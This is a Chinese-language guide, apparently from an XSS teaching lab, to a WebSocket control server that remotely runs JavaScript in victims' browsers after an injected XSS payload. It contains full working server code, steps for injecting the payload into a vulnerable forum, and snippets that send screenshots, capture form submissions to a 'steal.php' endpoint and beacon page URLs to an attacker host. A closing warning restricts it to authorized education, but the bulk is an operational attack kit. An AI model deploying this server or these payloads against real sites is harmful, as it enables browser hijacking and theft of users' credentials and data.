# WebSocket服务器使用指南

## 📋 概述

WebSocket服务器用于实现XSS实时控制功能，允许你远程执行JavaScript代码、查看在线设备、实时控制被注入的页面。

---

## 🚀 快速启动

### 方法一：使用PHP内置WebSocket服务器（推荐）

**1. 检查PHP扩展**
```bash
php -m | grep sockets
```

如果没有输出，需要启用sockets扩展：
- 打开 `php.ini` 文件
- 找到 `;extension=sockets`
- 删除前面的分号 `;`
- 重启PHP

**2. 启动WebSocket服务器**
```bash
cd D:\工作\太原教学计划\xss
php websocket_server.php
```

**3. 看到以下输出表示成功**
```
🚀 WebSocket服务器启动中...
📍 地址: ws://0.0.0.0:8080
⏰ 时间: 2024-01-01 12:00:00
====================================

✅ WebSocket服务器已启动！
💡 等待客户端连接...
```

---

### 方法二：使用Node.js WebSocket服务器（备选）

**1. 安装Node.js**
- 下载：https://nodejs.org/
- 安装后验证：`node -v`

**2. 创建Node.js WebSocket服务器**

创建文件 `websocket_server.js`：
```javascript
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 8080 });

const devices = new Map();

console.log('🚀 WebSocket服务器已启动！');
console.log('📍 地址: ws://localhost:8080');

wss.on('connection', (ws) => {
    console.log('📥 新客户端连接');
    
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        
        if (data.action === 'register') {
            const deviceId = 'device_' + Date.now();
            devices.set(deviceId, {
                socket: ws,
                id: deviceId,
                url: data.url,
                project: data.project
            });
            
            console.log(`✅ 设备注册: ${deviceId}`);
            ws.send(JSON.stringify({ action: 'registered', device_id: deviceId }));
        }
        
        if (data.action === 'execute') {
            console.log('⚡ 执行代码:', data.code);
            devices.forEach((device, id) => {
                if (data.device_id === 'all' || data.device_id === id) {
                    device.socket.send(JSON.stringify({
                        action: 'execute',
                        code: data.code
                    }));
                }
            });
        }
    });
    
    ws.on('close', () => {
        console.log('📤 客户端断开');
    });
});
```

**3. 运行服务器**
```bash
node websocket_server.js
```

---

## 💡 使用步骤

### 1. 启动WebSocket服务器

```bash
php websocket_server.php
```

### 2. 访问钓鱼平台演示页面

```
http://localhost/xss-lab/phishing_demo.php
```

### 3. 配置WebSocket地址

在"XSS Payload生成器"中：
- WebSocket地址：`ws://localhost:8080`
- 或局域网地址：`ws://192.168.1.100:8080`

### 4. 生成Payload

- 勾选"🎮 WebSocket控制"
- 点击"生成Payload代码"
- 复制生成的代码

### 5. 注入测试网站

- 在存在XSS漏洞的论坛粘贴代码
- 提交内容
- 刷新页面

### 6. 查看在线设备

在WebSocket服务器的控制台会看到：
```
✅ 设备注册: device_1234567890
   项目: xss_demo
   URL: http://localhost/xss-lab/forum.php
```

### 7. 实时控制

在钓鱼平台演示页面的"实时控制面板"中：
- 查看在线设备
- 选择目标设备
- 输入JavaScript代码
- 点击"执行代码"

---

## 🎯 功能演示

### 快捷命令

**📸 截图**
```javascript
html2canvas(document.body).then(c => {
    fetch('http://localhost/xss-lab/screenshot_simple.php', {
        method: 'POST',
        body: 'screenshot=' + encodeURIComponent(c.toDataURL('image/png'))
    });
});
```

**🍪 获取Cookie**
```javascript
alert('Cookies: ' + document.cookie);
```

**🔀 重定向**
```javascript
window.location.href = 'http://example.com';
```

**💬 弹窗测试**
```javascript
alert('XSS Test Success!');
```

---

## 🔧 常见问题

### Q1: WebSocket连接失败

**解决方案：**
1. 确认WebSocket服务器已启动
2. 检查防火墙是否阻止8080端口
3. 确认WebSocket地址正确（ws://不是http://）

### Q2: 设备没有注册

**解决方案：**
1. 检查Payload是否正确注入
2. 查看浏览器控制台是否有错误
3. 确认WebSocket服务器正在运行

### Q3: 无法执行代码

**解决方案：**
1. 确认设备已成功注册
2. 检查WebSocket服务器日志
3. 确认代码语法正确

### Q4: PHP sockets扩展无法启用

**解决方案：**
1. 使用Node.js版本的WebSocket服务器
2. 或使用第三方WebSocket服务

---

## 🌐 局域网访问

如果需要在局域网中访问：

**1. 修改WebSocket服务器地址**
```php
// websocket_server.php
$host = '0.0.0.0';  // 监听所有网卡
$port = 8080;
```

**2. 在Payload中使用局域网IP**
```
ws://192.168.1.100:8080
```

**3. 防火墙设置**
```bash
# Windows
netsh advfirewall firewall add rule name="WebSocket" dir=in action=allow protocol=tcp localport=8080

# Linux
sudo ufw allow 8080
```

---

## 📊 架构说明

```
┌─────────────┐
│  攻击者浏览器  │
│ (控制面板)    │
└──────┬──────┘
       │ WebSocket
       ↓
┌─────────────┐
│ WebSocket   │
│ 服务器       │
└──────┬──────┘
       │ WebSocket
       ↓
┌─────────────┐
│  受害者浏览器  │
│ (被注入页面)  │
└─────────────┘
```

**工作流程：**
1. 攻击者在控制面板输入代码
2. 代码通过WebSocket发送到服务器
3. 服务器转发给目标设备
4. 目标设备执行代码
5. 结果返回给攻击者

---

## ⚠️ 安全警告

**重要提示：**
- ✅ 仅用于授权测试环境
- ✅ 仅用于教育目的
- ❌ 禁止用于非法活动
- ❌ 禁止攻击未授权系统

---

## 📝 日志说明

WebSocket服务器会输出详细日志：

```
📥 新客户端连接 (2 个连接)
✅ 设备注册: device_abc123
   项目: xss_demo
   URL: http://localhost/xss-lab/forum.php

⚡ 执行代码
   目标设备: all
   代码长度: 156 字节

📤 设备断开: device_abc123
📤 客户端断开 (1 个连接)
```

---

## 🎓 进阶使用

### 自定义命令

你可以创建自定义命令：

```javascript
// 窃取表单数据
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', (e) => {
        const data = new FormData(form);
        fetch('http://your-server/steal.php', {
            method: 'POST',
            body: data
        });
    });
});
```

### 持久化控制

```javascript
// 定时发送数据
setInterval(() => {
    fetch('http://your-server/beacon.php', {
        method: 'POST',
        body: 'url=' + encodeURIComponent(window.location.href)
    });
}, 5000);
```

---

**WebSocket服务器已准备就绪，无需额外安装！** ✅
